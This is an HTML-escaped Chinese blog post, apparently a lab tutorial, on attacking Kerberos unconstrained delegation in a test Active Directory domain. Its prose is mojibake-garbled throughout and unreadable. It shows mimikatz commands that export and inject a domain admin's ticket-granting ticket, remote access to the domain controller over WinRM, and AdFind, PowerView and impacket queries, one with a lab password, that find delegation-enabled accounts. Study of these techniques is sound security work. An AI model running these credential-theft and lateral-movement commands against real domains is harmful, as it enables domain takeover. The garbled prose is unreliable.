&lt;p&gt;æœåŠ¡è´¦å·å¯ä»¥çœ‹å¦å¤–ä¸€ç¯‡æ–‡ç« äº†è§£ï¼š&lt;a href=&#34;https://xxe.icu/posts/ad_spn/&#34;&gt;åŸŸæ¸—é€-SPN&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Kerberoså§”æ´¾ä¸»è¦åˆ†ä¸ºä¸‰ç§ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;éçº¦æŸå§”æ´¾(Unconstrained Delegation)&lt;/li&gt;
&lt;li&gt;çº¦æŸå§”æ´¾(Constrained Delegation)&lt;/li&gt;
&lt;li&gt;åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾(Resource-Based Constrained Delegation)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æœ¬æ–‡å…ˆå®æˆ˜åç†è®ºï¼Œå› ä¸ºæˆ‘åœ¨å­¦ä¹ ç›¸å…³çš„çŸ¥è¯†çš„æ—¶å€™ï¼Œè¿™é‡Œé¢çš„ç†è®ºç‰¹åˆ«ï¼Œè€Œä¸”å¤æ‚ã€‚é‡‡ç”¨å…ˆå®æˆ˜çš„æ–¹å¼ï¼Œè®©å¤§å®¶å…ˆæ„Ÿå—è¿™ä¸ªæŠ€æœ¯åœ¨å®æˆ˜å½“ä¸­çš„åˆ©ç”¨æ–¹å¼å’Œå½±å“ï¼Œå¯¹åé¢äº†è§£ç†è®ºçš„æ—¶å€™å°±æ²¡é‚£ä¹ˆæ¯ç‡¥ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x01-éçº¦æŸå§”æ´¾&#34;&gt;0x01 éçº¦æŸå§”æ´¾&lt;/h1&gt;
&lt;p&gt;éçº¦æŸå§”æ´¾çš„æ”»å‡»æ–¹æ³•ä¸­æœ‰ä¸¤ç§ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è®¾ç½®ä¸»æœºè´¦æˆ·ä¸ºéçº¦æŸå§”æ´¾ï¼Œé€šè¿‡åŸŸç®¡ç†è´¦æˆ·å¯¹è¯¥ä¸»æœºè´¦æˆ·è¿›è¡Œè®¿é—®ï¼Œç•™ä¸‹ç¥¨æ®åœ¨è¯¥ä¸»æœºè´¦æˆ·ä¸‹ï¼Œç„¶åæ‹¿è¯¥ç¥¨æ®å»å†™å…¥å†…å­˜ï¼Œä»è€Œå¯ä»¥åˆ©ç”¨åŸŸç®¡ç†çš„TGTå»è®¿é—®åŸŸæ§ã€‚&lt;/li&gt;
&lt;li&gt;è®¾ç½®æœåŠ¡è´¦å·ä¸ºéçº¦æŸå§”æ´¾ï¼Œé€šè¿‡åŸŸç®¡ç†è´¦æˆ·å¯¹è¯¥æœåŠ¡è¿›è¡Œè®¿é—®ï¼Œç•™ä¸‹ç¥¨æ®åœ¨è¯¥ä¸»æœºè´¦æˆ·ä¸‹ï¼Œç„¶åæ‹¿è¯¥ç¥¨æ®å»å†™å…¥å†…å­˜ï¼Œä»è€Œå¯ä»¥åˆ©ç”¨åŸŸç®¡ç†çš„TGTå»è®¿é—®åŸŸæ§ã€‚ï¼ˆå®è·µåè¿™ç§æ— è®ºæ˜¯é€šè¿‡HTTPæˆ–è€…MSSQLæœåŠ¡çš„kerberoséƒ½ä¸ä¼šç•™ä¸‹ç¥¨æ®åœ¨è¯¥ä¸»æœºï¼‰&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è€Œä¸”é€šè¿‡æ–‡ç« &lt;a href=&#34;https://www.anquanke.com/post/id/92484#h3-3&#34;&gt;åˆ©ç”¨åŸŸå§”æ´¾è·å–åŸŸç®¡ç†æƒé™&lt;/a&gt;ä¸­çš„çš„éçº¦æŸæœåŠ¡è´¦å·çš„æ”»å‡»ä¹Ÿæ˜¯æ²¡æœ‰åŠæ³•å¤ç°ï¼ˆè²Œä¼¼è¿™ç§æ–¹æ³•æ˜¯çº¦æŸæ´¾çš„æ”»å‡»ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¬”è€…ç¬”è¯¯å¯¼è‡´çš„ï¼‰&lt;/p&gt;
&lt;p&gt;åŸæ–‡æ®µè½æè¿°ï¼š&lt;code&gt;ç”±äºsqlsvcè¢«è®¾ç½®ä¸ºéçº¦æŸæ€§å§”æ´¾ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨åˆšæ‰ä¼ªé€ çš„sqlsvcç¥¨æ®ï¼Œå‘åŸŸæœåŠ¡å™¨å‘èµ·ç”³è¯·è®¿é—®åŸŸæœåŠ¡å™¨service 1æœåŠ¡çš„ç®¡ç†å‘˜æƒé™çš„TGSçš„å‘½ä»¤ã€‚&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;ç¯å¢ƒ&#34;&gt;ç¯å¢ƒ&lt;/h2&gt;
&lt;p&gt;åŸŸï¼šhack.lab&lt;/p&gt;
&lt;p&gt;åŸŸæ§æœåŠ¡å™¨ï¼š172.16.0.106     åŸŸç®¡ç†ç”¨æˆ·ï¼šdc_admin  åŸŸæ§ä¸»æœºåï¼šdc&lt;/p&gt;
&lt;p&gt;åŸŸå†…ä¸»æœºï¼š172.16.0.105     æœ¬åœ°ç®¡ç†å‘˜ï¼šsc92n  åŸŸæ§ä¸»æœºåï¼šwin7a&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦é…ç½®ä¸€ä¸‹åŸŸå†…ä¸»æœºwin7açš„ä¸»æœºè´¦æˆ·ä¸ºéçº¦æŸå§”æ´¾ï¼Œæˆ‘ä»¬å…ˆåœ¨åŸŸæ§172.16.0.106ä¸Šé¢æ“ä½œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·æˆ‘ä»¬çš„å®éªŒç¯å¢ƒå°±åŸºæœ¬å®Œæˆäº†ï¼Œä¸‹é¢å°±å¼€å§‹å®æˆ˜æ”»å‡»ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®æˆ˜&#34;&gt;å®æˆ˜&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨åŸŸæ§æœåŠ¡å™¨ä¸Šä½¿ç”¨åŸŸç®¡ç†å‘˜dc_adminå¯¹win7aè¿›è¡Œè¿œç¨‹æ–‡ä»¶è®¿é—®(service 1æœåŠ¡)ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬å†æ¥åˆ°win7aä¸Šé¢ï¼Œä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜sc92nå¯åŠ¨&lt;a href=&#34;https://github.com/gentilkiwi/mimikatz&#34;&gt;mimikatz&lt;/a&gt;å·¥å…·å¯¼å‡ºç¥¨æ®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::tickets /export
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œåä¼šåœ¨å½“å‰ç›®å½•ç”ŸæˆåŸŸç®¡ç†å‘˜çš„TGTç¥¨æ®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç°åœ¨åªéœ€è¦æŠŠè¯¥ç¥¨æ®å¯¼å…¥å†…å­˜å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::ptt dc_admin@krbtgt-HACK.LAB.kirbi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯¼å…¥åæˆ‘ä»¬ä»win7aä¸»æœºå°±èƒ½è®¿é—®åŸŸæ§dcä¸Šé¢çš„æ–‡ä»¶äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœæƒ³æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨WinRMæœåŠ¡æ¥è¿œç¨‹è¿æ¥åŸŸæ§æœåŠ¡å™¨ï¼ŒWindows Server 2012åŠä»¥ä¸Šé»˜è®¤æ˜¯å¼€å¯WinRMæœåŠ¡çš„ã€‚&lt;/p&gt;
&lt;p&gt;Windows Server 2008 R2éœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¼€å¯WinRMæœåŠ¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;winrm quickconfig -q
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;è¿™æ¡å‘½ä»¤è¿è¡Œåä¼šè‡ªåŠ¨æ·»åŠ é˜²ç«å¢™ç­–ç•¥ï¼Œé˜²ç«å¢™é»˜è®¤ä¼šæ”¾è¡Œ5985ç«¯å£çš„&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨powerhsellæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter-PSSession -ComputerName DC
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;-ComputerNameæŒ‡å®šä¸»æœºå
å¦‚æœWinRMæœåŠ¡ç«¯å£æ”¹äº†çš„è¯ï¼Œå¯ä»¥ç”¨-PortæŒ‡å®šWinRMç«¯å£ï¼Œé»˜è®¤æ˜¯5985&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;åŸç†&#34;&gt;åŸç†&lt;/h2&gt;
&lt;p&gt;æœåŠ¡(å¦‚&lt;code&gt;WIN7A&lt;/code&gt;) è¢«é…ç½®äº†éçº¦æŸçš„å§”æ´¾ï¼Œé‚£ä¹ˆ&lt;code&gt;WIN7A&lt;/code&gt;å¯ä»¥æ¥å—ä»»ä½•ç”¨æˆ·çš„å§”æ´¾çš„å»è¯·æ±‚å…¶ä»–æ‰€æœ‰æœåŠ¡ã€‚åœ¨åè®®å±‚é¢çš„å®ç°å°±æ˜¯ï¼ŒæŸä¸ªç”¨æˆ·å§”æ‰˜&lt;code&gt;WIN7A&lt;/code&gt;å»è®¿é—®æŸä¸ªæœåŠ¡ï¼Œé‚£ä¹ˆè¿™ä¸ªç”¨æˆ·ä¼šå°† TGTï¼ˆåœ¨TGSé‡Œé¢ï¼‰å‘é€åˆ°&lt;code&gt;WIN7A&lt;/code&gt;å¹¶ç¼“å­˜åˆ°LSASSä¸­ï¼Œä»¥æ–¹ä¾¿ä»¥åä½¿ç”¨ã€‚ ç„¶å&lt;code&gt;WIN7A&lt;/code&gt;æ¨¡æ‹Ÿç”¨æˆ·å»è¯·æ±‚æŸä¸ªæœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;ç›¸ä¿¡å¤§å®¶éƒ½åœ¨å¾ˆå¤šæ–‡ç« ä¸­çœ‹åˆ°ä¸‹é¢è¿™å¼ å›¾ï¼Œæ˜¯æ¥è‡ªå¾®è½¯å®˜æ–¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸»è¦çš„æµç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç”¨æˆ·(dc_admin)é€šè¿‡å‘é€ KRB_AS_REQ æ¶ˆæ¯å‘å¯†é’¥åˆ†å‘ä¸­å¿ƒ (KDC) è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè¯¥æ¶ˆæ¯æ˜¯èº«ä»½éªŒè¯æœåŠ¡ (AS) äº¤æ¢ä¸­çš„è¯·æ±‚æ¶ˆæ¯ï¼Œå¹¶è¯·æ±‚å¯è½¬å‘çš„ TGTã€‚&lt;/li&gt;
&lt;li&gt;KDC åœ¨ KRB_AS_REP æ¶ˆæ¯ä¸­è¿”å›ä¸€ä¸ªå¯è½¬å‘çš„ TGTï¼Œè¿™æ˜¯èº«ä»½éªŒè¯æœåŠ¡ (AS) äº¤æ¢ä¸­çš„å“åº”æ¶ˆæ¯ã€‚&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·(dc_admin)æ ¹æ®æ­¥éª¤ 2 ä¸­çš„å¯è½¬å‘ TGT è¯·æ±‚è½¬å‘ TGT,è¿™æ˜¯é€šè¿‡ KRB_TGS_REQ æ¶ˆæ¯å®Œæˆçš„ã€‚&lt;/li&gt;
&lt;li&gt;KDC åœ¨ KRB_TGS_REP æ¶ˆæ¯ä¸­ä¸ºç”¨æˆ·(dc_admin)è¿”å›ä¸€ä¸ªè½¬å‘çš„ TGTã€‚&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·(dc_admin)ä½¿ç”¨æ­¥éª¤ 2 ä¸­è¿”å›çš„ TGT å‘æœåŠ¡ 1(service 1/WIN7A) è¯·æ±‚æœåŠ¡ç¥¨è¯ã€‚è¿™æ˜¯é€šè¿‡ KRB_TGS_REQ æ¶ˆæ¯å®Œæˆçš„ã€‚&lt;/li&gt;
&lt;li&gt;ç¥¨è¯æˆäºˆæœåŠ¡ (TGS) åœ¨ KRB_TGS_REP ä¸­è¿”å›æœåŠ¡ç¥¨è¯ã€‚&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·é€šè¿‡å‘é€ KRB_AP_REQ æ¶ˆæ¯å‘æœåŠ¡ 1(service 1) å‘å‡ºè¯·æ±‚ï¼Œæä¾›æœåŠ¡ç¥¨è¯(ST)ã€è½¬å‘çš„ TGT å’Œè½¬å‘çš„ TGT çš„ä¼šè¯å¯†é’¥ã€‚&lt;/li&gt;
&lt;li&gt;ä¸ºäº†æ»¡è¶³ç”¨æˆ·(dc_admin)çš„è¯·æ±‚ï¼ŒæœåŠ¡ 1 (service 1) éœ€è¦æœåŠ¡ 2 (å…¶ä»–æœåŠ¡)ä»£è¡¨ç”¨æˆ·æ‰§è¡Œä¸€äº›æ“ä½œï¼ŒæœåŠ¡ 1 ä½¿ç”¨è½¬å‘çš„ç”¨æˆ· TGT å¹¶å°†å…¶ä»¥ KRB_TGS_REQ çš„å½¢å¼å‘é€åˆ° KDCï¼Œä»¥ç”¨æˆ·çš„åä¹‰è¯·æ±‚æœåŠ¡ 2 çš„ç¥¨è¯ã€‚&lt;/li&gt;
&lt;li&gt;KDC åœ¨ KRB_TGS_REP æ¶ˆæ¯ä¸­å°†æœåŠ¡ 2 çš„ç¥¨è¯è¿åŒæœåŠ¡ 1 å¯ä»¥ä½¿ç”¨çš„ä¼šè¯å¯†é’¥ä¸€èµ·è¿”å›ç»™æœåŠ¡ 1ï¼Œç¥¨è¯å°†å®¢æˆ·ç«¯æ ‡è¯†ä¸ºç”¨æˆ·(dc_admin)ï¼Œè€Œä¸æ˜¯æœåŠ¡ 1 (service 1)ã€‚&lt;/li&gt;
&lt;li&gt;æœåŠ¡ 1  (service 1)ä½œä¸ºç”¨æˆ·(dc_admin)é€šè¿‡ KRB_AP_REQ å‘æœåŠ¡ 2 (å…¶ä»–æœåŠ¡)å‘å‡ºè¯·æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;æœåŠ¡ 2(å…¶ä»–æœåŠ¡) å“åº”ã€‚&lt;/li&gt;
&lt;li&gt;é€šè¿‡è¯¥å“åº”ï¼ŒæœåŠ¡ 1 ç°åœ¨å¯ä»¥å“åº”ç”¨æˆ·(dc_admin)åœ¨æ­¥éª¤ 7 ä¸­çš„è¯·æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;æ­¤å¤„æè¿°çš„ TGT è½¬å‘å§”æ´¾æœºåˆ¶ä¸é™åˆ¶æœåŠ¡ 1 ä½¿ç”¨è½¬å‘çš„ TGTï¼ŒæœåŠ¡ 1 å¯ä»¥ä»¥ç”¨æˆ·(dc_admin)çš„åä¹‰å‘ KDC ç´¢è¦ä»»ä½•å…¶ä»–æœåŠ¡çš„ç¥¨è¯ã€‚&lt;/li&gt;
&lt;li&gt;KDC å°†è¿”å›è¯·æ±‚çš„ç¥¨è¯ã€‚&lt;/li&gt;
&lt;li&gt;ç„¶åï¼ŒæœåŠ¡ 1 (service 1/WIN7A)å¯ä»¥ç»§ç»­ä½¿ç”¨æœåŠ¡ N (å…¶ä»–æœåŠ¡)å†’å……ç”¨æˆ·(dc_admin)è¿›è¡Œè®¿é—®ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸‹é¢æ˜¯è®¾ç½®äº†éçº¦æŸçš„çš„ä¸»æœºWIN7Aï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨åŸŸæ§çš„ADSI ç¼–è¾‘å™¨ï¼ˆadsiedit.mscï¼‰ä¸­æŸ¥è¯¢ï¼Œä¸»æœºè´¦æˆ·WIN7Aå±æ€§ä¸­çš„ä¸€é¡¹userAccountControlï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸€é¡¹åŒ…å«äº†&lt;code&gt;TRUSTED_FOR_DELEGATION&lt;/code&gt;(éçº¦æŸå§”æ´¾),å¯¹åº”çš„å€¼æ˜¯ 0x80000 ï¼Œä¹Ÿå°±æ˜¯ 524288ã€‚ä¸ºä»€ä¹ˆä¼šæ˜¾ç¤º528384å‘¢ï¼Œå¦‚æœç”¨è¿™ä¸ªæ•°å€¼å‡å»524288å°±ä¼šå¾—åˆ°&lt;code&gt;WORKSTATION_TRUST_ACCOUNT&lt;/code&gt;çš„æ•°å€¼4096ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœè®¾ç½®äº†æœåŠ¡è´¦å·ï¼Œå‡å»524288ï¼Œå°±ä¼šå¾—åˆ°66048ï¼Œå› ä¸º&lt;code&gt;NORMAL_ACCOUNT&lt;/code&gt; (512) + &lt;code&gt;DONT_EXPIRE_PASSWORD&lt;/code&gt; (65536) = 66048ã€‚&lt;/p&gt;
&lt;p&gt;å…·ä½“å¯ä»¥é˜…è¯»æ–‡ç« ï¼š&lt;a href=&#34;decoding-ad-useraccountcontrol-value&#34;&gt;Converting UserAccountControl Attribute Values in Active Directory&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é€šè¿‡è¿™ä¸ª524288æ•°å€¼æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“æ€ä¹ˆå»æŸ¥æ‰¾å­˜åœ¨éçº¦æŸçš„ä¸»æœºè´¦æˆ·æˆ–è€…æœåŠ¡è´¦å·äº†ï¼Œä¸‹é¢ä¼šæœ‰ä»‹ç»åˆ°ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å‘ç°éçº¦æŸå§”æ´¾ä¿¡æ¯&#34;&gt;å‘ç°éçº¦æŸå§”æ´¾ä¿¡æ¯&lt;/h2&gt;
&lt;h3 id=&#34;adfind&#34;&gt;AdFind&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://www.joeware.net/freetools/tools/adfind/index.htm&#34;&gt;AdFind&lt;/a&gt;å·¥å…·ä½¿ç”¨LDAPåè®®æŸ¥è¯¢åŸŸå†…çš„å„ç§ä¿¡æ¯ï¼Œä¸‹é¢æ˜¯æŸ¥è¯¢éçº¦æŸå§”æ´¾ä¸»æœºè´¦å·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;AdFind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-b&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;DC=hack,DC=lab&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cn&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;distinguishedName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åŸŸæ§é»˜è®¤è®¾ç½®ä¸ºéçº¦æŸå§”æ´¾&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚æœæ˜¯æœåŠ¡è´¦å·ï¼Œæ‰§è¡Œä¸‹é¢çš„è¯­å¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;AdFind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-b&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;DC=hack,DC=lab&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cn&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;distinguishedName&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;UserAccountControl:1.2.840.113556.1.4.803:=524288 è¡¨ç¤ºåœ¨ADä¸­æ‰€æœ‰å­˜åœ¨éçº¦æŸçš„è´¦å·&lt;/p&gt;
&lt;p&gt;sAMAccountType=805306369 è¡¨ç¤ºåœ¨ADæ€»çš„æ‰€æœ‰è´¦å·&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;powerview&#34;&gt;PowerView&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&#34;&gt;PowerView.ps1&lt;/a&gt;æ˜¯PowerSploitå·¥å…·åŒ…ä¸­çš„ä¸€æ¬¾è„šæœ¬ï¼Œç”¨æ³•å¦‚ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢éçº¦æŸçš„ä¸»æœºè´¦æˆ·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp; {Import-Module .\powerview.ps1;Get-NetComputer -Unconstrained -Domain hack.lab }&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢éçº¦æŸçš„æœåŠ¡è´¦æˆ·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp; {Import-Module .\PowerView.ps1;Get-NetUser -Unconstrained -Domain hack.lab | select name }&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;æœ€æ–°çš„è„šæœ¬ä¸­Get-NetUseræ²¡æœ‰ -Unconstrainedå‚æ•°&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;finddelegationpy&#34;&gt;findDelegation.py&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py&#34;&gt;findDelegation.py&lt;/a&gt;æ˜¯é›†æˆåœ¨impacketå·¥å…·åŒ…ä¸­çš„ä¸€æ¬¾å·¥å…·ï¼Œå…·ä½“ç”¨æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;findDelegation.py -dc-ip 172.16.0.106 -target-domain hack.lab hack.lab/lucky:p@ssw0rd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ¬¾å·¥å…·åˆ†åˆ«æŸ¥è¯¢å‡ºäº†å­˜åœ¨éçº¦æŸçš„ä¸»æœºç”¨æˆ·å’ŒæœåŠ¡ç”¨æˆ·ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ldapsearch&#34;&gt;ldapsearch&lt;/h3&gt;
&lt;p&gt;è¿™æ¬¾æ˜¯kaliè‡ªå¸¦ï¼Œå¯ä»¥åœ¨åŸŸå¤–ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š&lt;/p&gt;
